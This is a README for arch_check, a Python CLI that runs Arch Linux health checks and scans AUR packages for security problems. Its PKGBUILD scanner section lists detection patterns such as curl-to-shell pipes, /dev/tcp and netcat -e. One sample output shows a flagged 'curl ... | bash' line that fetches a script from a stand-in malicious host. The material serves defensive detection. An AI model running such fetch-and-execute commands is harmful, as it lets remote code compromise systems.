# arch_check

**Arch Linux System Health & Security CLI**  
*Comprehensive system health, AUR security scanning, and disk ancestry for Arch Linux.*

---

## Overview

**arch_check** is a comprehensive CLI tool for Arch Linux that performs system health checks, security audits, and disk ancestry tracking. It offers three run modes for flexibility:

- **Quick mode** (`-q`): Fast health snapshot in seconds, no root required
- **Full audit** (`-a`): Complete system check including slow and security checks
- **Security mode** (`--security`): Security-focused checks only (ports, logins, rootkits)

Built with pure Python standard library (zero external dependencies), it glues together system utilities and presents results in a clear, colorized format with optional JSON output.

**Problem Solved:**
From basic disk usage to AUR package security scanning—arch_check consolidates 20+ system checks into one tool. Ideal for daily health snapshots, pre-update audits, or security reviews.

---

## Run Modes

```sh
arch-check -q               Quick health snapshot (seconds)
arch-check -a               Full audit (slower, some need root)
arch-check --security       Security-focused checks only
arch-check -q --security    Quick + security checks
arch-check -a --no-rkhunter Full audit, skip rkhunter
arch-check -j -q            Quick audit as JSON
```

---

## What's New

| Version | Highlights |
|---------|--------|
| **0.4.0** (unreleased) | Added `--aur-stale` (AUR version mismatch checks via aur.archlinux.org API), `--pacman-log` (tracks recent package installs/upgrades/removals); removed `--rkhunter` for reliability; improved `systemd_timers` (informational only) and `boot_blame` thresholds (45s limit). |
| **0.3.1** | Improved orphan package messaging with safety warnings. |
| **0.3.0** | Restructured: AUR checks moved to separate repository for focused maintenance. |
| **0.2.0** | Added Arch Linux PKGBUILD and pacman integration for system-wide installation. |
| **0.1.0** | Initial release with 11 core system health checks (disk, sensors, kernel, pacnew, services, orphans, stats, SMART, logo, disk, kernel). |

---

## Key Features

### Core System Checks
| Check | Purpose | Details |
|-------|---------|----------|
| `-l, --logo` | Print Arch logo with hardware summary | [→ Hardware info](#--logo---arch-logo-with-hardware) |
| `-d, --disk` | Mountpoint usage, filesystems, device origin | [→ Disk usage](#-d---disk---disk-usage--origin) |
| `--sensors` | CPU/system temperatures | [→ Temperature sensors](#--sensors---temperature-sensors) |
| `--smart` | Disk health via SMART attributes | [→ SMART status](#--smart---disk-health) |
| `-k, --kernel` | Check installed vs running kernel version | [→ Kernel check](#--kernel---kernel-version) |
| `-p, --pacnew` | Unmerged config files with age analysis | [→ Config files](#-p---pacnew---config-files-with-age) |
| `-s, --services` | Failed systemd services | [→ Failed services](#--services---failed-services) |
| `-o, --orphans` | Orphaned packages (unused dependencies) | [→ Orphaned packages](#--orphans---orphaned-packages) |
| `-t, --stats` | Package counts and cache sizes | [→ Package stats](#--stats---package-statistics) |

### Quick System Metrics
| Check | Purpose | Details |
|-------|---------|----------|
| `--timedatectl` | NTP sync status and timezone | [→ Time & Date](#--timedatectl---time--date-sync) |
| `--load-avg` | System load vs CPU count (warns at 75%/100%) | [→ Load average](#--load-avg---system-load) |
| `--inotify` | Inotify watch descriptor usage | [→ Inotify limit](#--inotify---inotify-limit) |
| `--checkupdates` | Pending package updates (informational) | [→ Pending updates](#--checkupdates---pending-updates) |
| `--timers` | Systemd timer status (informational) | [→ Systemd timers](#--timers---systemd-timers) |
| `--boot-blame` | Boot time & slowest units (>45s warning) | [→ Boot timing](#--boot-blame---boot-timing) |
| `--arch-audit` | AUR package CVE vulnerabilities | [→ AUR audit](#--arch-audit---aur-vulnerabilities) |

### AUR Security Scanning
| Check | Purpose | Details |
|-------|---------|----------|
| `--aur-integrity` | Missing/modified files in AUR packages | [→ AUR integrity](#--aur-integrity---aur-package-integrity) |
| `--aur-paths` | Files outside standard installation paths | [→ AUR paths](#--aur-paths---non-standard-paths) |
| `--aur-suid` | Setuid/setgid binaries (with whitelist) | [→ AUR setuid](#--aur-suid---setuidsetgid-files) |
| `--aur-pkgbuild` | Suspicious shell patterns in PKGBUILDs | [→ PKGBUILD scan](#--aur-pkgbuild---pkgbuild-security-scanning-with-safe-pattern-exclusions) |
| `--aur-stale` | AUR version mismatches & outdated flags | [→ AUR stale](#--aur-stale---aur-staleness-check) |

### Slow Checks (Full Audit Only)
| Check | Purpose | Details |
|-------|---------|----------|
| `--journal` | Critical/alert journal messages (24h) | [→ Journal errors](#--journal---journal-errors) |
| `--dmesg` | Kernel ring buffer errors | [→ Kernel errors](#--dmesg---kernel-errors) |

### Security Checks
| Check | Purpose | Details |
|-------|---------|----------|
| `--ports` | Listening ports & unexpected services | [→ Listening ports](#--ports---listening-ports) |
| `--failed-logins` | Failed login attempts (brute-force detection) | [→ Failed logins](#--failed-logins---failed-login-analysis) |
| `--pacman-log` | Recent package changes from pacman log | [→ Pacman log](#--pacman-log---recent-package-changes) |

### Output Features
- **Colorized Output:** Auto-detects terminal, supports `--color`/`--no-color`
- **JSON Output:** Machine-readable output for scripting (`-j`)

---

## Skipped Filesystems

To keep output focused, arch_check skips virtual, temporary, and special-purpose filesystems:

**Skipped:** swap, tmpfs, devtmpfs, proc, sysfs, cgroup, mqueue, hugetlbfs, fusectl, configfs, securityfs, pstore, efivarfs, debugfs, tracefs, ramfs, overlay, squashfs, autofs, binfmt_misc, bpf, nsfs

---

## Prerequisites & Dependencies

- **Python:** 3.8 or newer
- **Arch Linux:** Required for full features
- **System packages (optional, for full features):**
  - `btrfs-progs` (btrfs usage/subvolume info)
  - `lm_sensors` (temperature sensors)
  - `smartmontools` (SMART disk health)
  - `pacman-contrib` (checkupdates command)
  - `arch-audit` (AUR vulnerability scanning)
  - `rkhunter` (rootkit scanning)

**Note:** Some checks require root privileges for full information (SMART, inotify usage, failed logins, rkhunter). Run with `sudo` when needed.

---

## Installation

**Recommended (pipx):**
```sh
pipx install .
```

**Arch Linux (PKGBUILD):**
```sh
makepkg -si
```
This installs the CLI as `/usr/bin/arch_check`.

---

## Usage

### Quick Start

```sh
arch-check -q              # Quick health snapshot
arch-check -a              # Full system audit
arch-check --security      # Security checks only
sudo arch-check -a         # Full audit with root privileges
```

### Available Flags

```
Run Modes:
  -q, --quick            Run quick health checks only (seconds, no root needed)
  -a, --all              Run all health checks (quick + slow + security)
  --security             Run security-focused checks only

Core Checks:
  -l, --logo             Print Arch logo and hardware summary
  --sensors              Temperature sensors
  -k, --kernel           Kernel version mismatch check
  -p, --pacnew           Config file alerts (.pacnew/.pacsave)
  -s, --services         Failed systemd services
  -o, --orphans          Orphaned packages
  -d, --disk             Disk usage and origin
  -t, --stats            Pacman statistics
  --smart                SMART disk health

Quick Checks:
  --timedatectl          NTP sync and timezone status
  --load-avg             System load vs CPU count
  --inotify              Inotify watch limit usage
  --checkupdates         Pending updates display
  --timers               Systemd timer status
  --boot-blame           Boot timing analysis
  --arch-audit           AUR vulnerability scanning

AUR Security:
  --aur-integrity        AUR package file integrity
  --aur-paths            Non-standard install paths
  --aur-suid             Setuid/setgid file detection
  --aur-pkgbuild         PKGBUILD security scanning

Slow Checks:
  --journal              Journal errors (24h)
  --dmesg                Kernel errors

Security:
  --ports                Listening ports analysis
  --failed-logins        Failed login attempts
  --rkhunter             Rootkit scanner (slow)

Output:
  -j, --json             JSON output for scripting
  --color / --no-color   Force color/no-color
```

---

## Check Reference

Detailed technical description of what each check does, what data it gathers, and what it flags.

### **--aur-integrity** (AUR Security)
**Data Gathered:** AUR package file list via `pacman -Qk` (foreign packages); detects missing and modified files  
**Flags:** Packages with missing files (count shown), modified files (excludes noisy paths like .pyc, .log, .a)  
**Requires:** None (native pacman command)

### **--aur-paths** (AUR Security)
**Data Gathered:** File paths for all AUR packages via `pacman -Ql`; checks against standard prefixes (/usr, /etc, /var, /opt, /lib, /lib32, /bin, /sbin, /run, /share)  
**Flags:** Files installed outside standard system paths as unusual/suspicious  
**Requires:** None

### **--aur-pkgbuild** (AUR Security)
**Data Gathered:** Scans PKGBUILD files from yay/paru cache for 9 suspicious patterns (curl|sh pipes, eval, base64, python -c inline exec, /dev/tcp, netcat -e, dangerous rm -rf, SKIPCHECKSUMS)  
**Flags:** Pattern matches with line numbers and context; applies safe-pattern whitelist (python -m, pip --no-deps, etc.) to reduce false positives  
**Requires:** yay/paru cache or $PKGBUILD_CACHE_DIR; notes uncached PKGBUILDs for manual review

### **--aur-suid** (AUR Security)
**Data Gathered:** Stat info for all files in AUR packages; checks for setuid/setgid bits  
**Flags:** Unexpected privilege-escalation binaries (whitelisted: chrome-sandbox, pmount, pumount, v4l-conf)  
**Requires:** None

### **--aur-stale** (AUR Security)
**Data Gathered:** AUR package versions from local system vs aur.archlinux.org RPC API; checks maintainer flags  
**Flags:** Updates available (version mismatch), maintainer-marked outdated packages, packages not found on AUR  
**Requires:** Network access; requires `pacman` for package list

### **--arch-audit** (Quick Check)
**Data Gathered:** Known CVE vulnerabilities in AUR packages via `arch-audit` tool; groups by severity (HIGH, MEDIUM, LOW)  
**Flags:** HIGH severity as issues; displays all levels; notes if arch-audit not installed  
**Requires:** `arch-audit` package

### **--boot-blame** (Quick Check)
**Data Gathered:** Total boot time and top 10 slowest systemd units from `systemd-analyze blame`  
**Flags:** Total >45 seconds (critical), 30-45 seconds (advisory); per-unit: >30s non-maintenance units (red), >10s (yellow)  
**Requires:** systemd; `systemd-analyze` tool

### **--checkupdates** (Quick Check)
**Data Gathered:** Pending package updates from `checkupdates` (pacman-contrib); list of available updates  
**Flags:** Informational only (does not count as issue); notes if checkupdates not installed  
**Requires:** `pacman-contrib` package

### **--dmesg** (Slow Check)
**Data Gathered:** Kernel ring buffer via `dmesg`; categorizes by keyword (mce, hardware error, I/O error, OOM, etc.)  
**Flags:** Critical keywords (mce, I/O, OOM, filesystem error) in red; others in yellow; counts total errors  
**Requires:** None (may need root for full history)

### **--disk** (Core Check)
**Data Gathered:** Mountpoint usage via `lsblk -f -J` and `df -h`; filesystem type, device info, device origin chain (LVM/LUKS/physical via lsblk); btrfs-specific usage via `btrfs filesystem usage`  
**Flags:** Low free space on any mount; shows usage %, free space in GB; tracks device lineage  
**Requires:** root for accurate LVM/LUKS info and btrfs usage

### **--inotify** (Quick Check)
**Data Gathered:** Inotify max watch limit from `/proc/sys/fs/inotify/max_user_watches`; current usage by scanning `/proc/[pid]/fd`  
**Flags:** >90% usage (critical), 75-90% (warning); accurate count requires root  
**Requires:** Reads /proc (root for accurate count)

### **--journal** (Slow Check)
**Data Gathered:** systemd journal messages with crit..alert priority (last 24h) via `journalctl`; groups by originating unit; finds top 10 noisiest units  
**Flags:** >50 errors in 24h (critical), >10 (warning); displays recent error lines per unit  
**Requires:** `journalctl` tool (systemd)

### **--kernel** (Core Check)
**Data Gathered:** Installed kernel version from pacman database; running kernel from `uname -r`; parses major/minor/patch/arch components  
**Flags:** Any version component mismatch (reboot required for new modules to load)  
**Requires:** None

### **--load-avg** (Quick Check)
**Data Gathered:** System load average (1, 5, 15-minute) from `/proc/loadavg`; CPU core count from `/proc/cpuinfo`  
**Flags:** 15-min load >100% of cores (critical), >75% of cores (warning)  
**Requires:** Reads /proc

### **--logo** (Core Check)
**Data Gathered:** Arch ASCII logo; gathers hardware info (user, host, OS, kernel, shell, CPU model, memory size) from system commands  
**Flags:** Informational only; formatted side-by-side with logo  
**Requires:** None

### **--orphans** (Core Check)
**Data Gathered:** Orphaned packages (installed as dependencies, no longer required) via `pacman -Qdtq`  
**Flags:** Each orphaned package as an issue; provides removal command guidance  
**Requires:** None

### **--pacman-log** (Security Check)
**Data Gathered:** Parses `/var/log/pacman.log` for installs, upgrades, removals within lookback window (default 30 days)  
**Flags:** Silent dependency removals (removed without explicit request), systems not upgraded in 30+ days  
**Requires:** Read access to /var/log/pacman.log; supports --pacman-log-days N for custom window

### **--pacnew** (Core Check)
**Data Gathered:** Scans /etc for .pacnew and .pacsave files; calculates age in days  
**Flags:** Each config file as issue; color-codes by age (red >90 days = high risk, yellow 7-90 days, green <7 days)  
**Requires:** None

### **--ports** (Security Check)
**Data Gathered:** Listening TCP/UDP ports via `ss -tlnp` (socket statistics); maps to systemd units  
**Flags:** Unexpected listeners (not managed by systemd), externally reachable services (0.0.0.0, ::); shows protocol, address, port, process  
**Requires:** root for process names; `ss` tool (iproute2)

### **--sensors** (Core Check)
**Data Gathered:** System temperature sensors via `sensors` command (lm_sensors)  
**Flags:** Temps ≥80°C (red, critical), 70-79°C (yellow, warn); lists all sensor readings  
**Requires:** `lm_sensors` package; may need root for some systems

### **--services** (Core Check)
**Data Gathered:** Failed systemd units via `systemctl list-units --state=failed`  
**Flags:** Each failed service as an issue  
**Requires:** systemd

### **--smart** (Core Check)
**Data Gathered:** Disk SMART health status via `smartctl` for all disks (/dev/sd*, /dev/nvme*n1); includes device attributes (Reallocated_Sector_Ct, Power_On_Hours, Temperature_Celsius, Media_Wearout_Indicator)  
**Flags:** FAILED status, missing PASSED health check; warns if smartctl unavailable or permission denied  
**Requires:** `smartmontools` package; root for full info

### **--stats** (Core Check)
**Data Gathered:** Pacman database statistics (total, native, foreign/AUR, explicit, dependencies) and cache sizes (pacman, yay, paru)  
**Flags:** Informational only; suggests cleanup if yay/paru built packages >100MB  
**Requires:** None

### **--timedatectl** (Quick Check)
**Data Gathered:** Timezone, NTP service status, synchronization state, current system time from `timedatectl show`  
**Flags:** NTP sync off (warning), UTC timezone unusual for personal machines (info)  
**Requires:** systemd

### **--timers** (Quick Check)
**Data Gathered:** Systemd timer status and schedule from `systemctl list-timers`; includes last run and next run times  
**Flags:** Informational only (does not increment issue count); notes timers that have never run (LAST = n/a)  
**Requires:** systemd

### **--failed-logins** (Security Check)
**Data Gathered:** Failed login attempts from `/var/log/btmp` via `lastb`; groups by user and source IP  
**Flags:** >10 failed attempts (warning), >100 (critical, likely brute-force); requires root for access  
**Requires:** root; `lastb` command (util-linux)

---

## Usage Examples

### `-d`, `--disk` - Disk Usage & Origin

**What it does:** Parses lsblk and /etc/fstab to show mountpoint usage, filesystem type, and device origin chain (tracking LVM, LUKS, and physical devices).

**Example (ext4, LVM, LUKS):**
```
Mount           : Usage    : Free       : FS       : Type       : Device                 : Origin                               : Subvol
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
/               :   32.0% :    127G GB : ext4     : 1.0        : /dev/volume-root       : nvme0n1.nvme0n1p2.cryptlvm.volume-root :
/boot           :   28.0% :    370M GB : vfat     : FAT32      : /dev/nvme0n1p1         : nvme0n1.nvme0n1p1                    :
/home           :   41.0% :    909G GB : ext4     : 1.0        : /dev/volume-home       : nvme0n1.nvme0n1p2.cryptlvm.volume-home :
```

### `--timedatectl` - Time & Date Sync

**What it does:** Queries timedatectl to check NTP synchronization status and timezone, flagging if sync is disabled or timezone is UTC.

**Example:**
```
========== Time & Date (timedatectl) ==========
Timezone: America/New_York
NTP Service: active
Synchronized: yes
Local Time: 2024-01-15 14:32:45
```

### `--load-avg` - System Load

**What it does:** Compares 1/5/15-minute load average from /proc/loadavg against CPU core count, warning if load exceeds 75% or 100% of cores.

**Example:**
```
========== System Load Average ==========
CPU Count: 8
Load Average (1/5/15 min): 0.45 / 0.52 / 0.48
Threshold (15-min): 8
```

### `--aur-integrity` - AUR Package Integrity

**What it does:** Runs `pacman -Qk` on all AUR (foreign) packages to detect missing or modified files, filtering out noisy paths like .pyc and .log files.

**Example:**
```
========== AUR Package Integrity ==========
Warning: 1 package(s) with integrity issues:

google-chrome
  Modified files: 2
    - /opt/google/chrome/MEIPreload/preflight
    ... and 1 more
```

### `--ports` - Listening Ports

**What it does:** Uses `ss` to list all listening TCP/UDP ports, maps them to systemd units, and flags unexpected services or externally reachable listeners.

**Example:**
```
========== Listening Ports ==========
PROTO : ADDRESS          : PORT  : PROCESS           : MANAGED
───────────────────────────────────────────────────────────────────
tcp   : 127.0.0.1        : 3306  : mysqld            : yes
tcp   : 0.0.0.0          : 80    : nginx             : yes
```

### `-p`, `--pacnew` - Config Files with Age

**What it does:** Scans /etc for unapplied .pacnew and .pacsave config files, calculates age in days, and color-codes by risk (red >90 days, yellow 7-90 days, green <7 days).

**Example:**
```
========== Config Files (.pacnew/.pacsave) ==========
  -> /etc/pacman.conf.pacnew (2 days old)
  -> /etc/pulse/default.pa.pacnew (45 days old)
  -> /etc/ssh/sshd_config.pacnew (120 days old)
```

### `--aur-pkgbuild` - PKGBUILD Security Scanning with Safe Pattern Exclusions

**What it does:** Scans PKGBUILD files from yay/paru cache for 9 suspicious shell patterns (curl|sh pipes, eval, base64, python inline exec, /dev/tcp, netcat, rm -rf, SKIPCHECKSUMS). Includes intelligent safe-pattern whitelist to reduce false positives (python -m, pip --no-deps, standard python idioms).

**Example Output:**
```
========== AUR PKGBUILD Security Scan ==========

Suspicious patterns detected:

malicious-package (from yay cache)
  Patterns: curl_pipe_shell, eval_subshell
  Line 45: curl https://malicious-source.com/install.sh | bash
    [FLAGGED]
  Excluded (known safe patterns):
    Line 23: python -c "import site; print(site.getsitepackages())"
      → standard idiom to locate site-packages install path
    Line 28: pip install --no-deps ./wheel-file.whl
      → used in -bin packages to install pre-built wheel without remote dependencies

Summary: 1542 scanned, 12 not cached (manual review), 3 flagged
```

**Safe Pattern Exclusions (Auto-Whitelisted):**

The PKGBUILD scanner now recognizes these common safe patterns and excludes them from flagging:

1. **`python -c "import site..."`** — Standard idiom to locate site-packages directory, present in hundreds of legitimate PKGBUILDs
2. **`python -c "import sys..."`** — Used to check Python version or sys.path at build time
3. **`python -c "from distutils..."`** — Legacy distutils path/version lookup, common in older PKGBUILDs
4. **`pip install --no-deps`** — Used in -bin packages to install local pre-built wheels without pulling remote dependencies

**Auditable Output:** Whitelisted lines are shown with explanatory reasons in the human output and included in JSON for audit trails.

---

## JSON Output

When using `-j`, arch_check returns structured output with per-section status and issues:

```json
{
  "disk": {
    "mounts": [...],
    "status": "ok",
    "issues": 0
  },
  "aur_integrity": {
    "status": "attention",
    "issues": 1,
    "packages_checked": 15,
    "packages_with_issues": [...]
  },
  "summary": {
    "issues": 2,
    "issues_by_section": {
      "disk": 0,
      "aur_integrity": 1,
      "ports": 1
    },
    "status": "attention"
  }
}
```

---

## Contributing

Found a bug or want to add a feature? Please open an issue or submit a pull request on the [GitHub repository](https://github.com/kidpixo/arch_check).

---

## License

**0BSD** — Free for any use, no warranty.
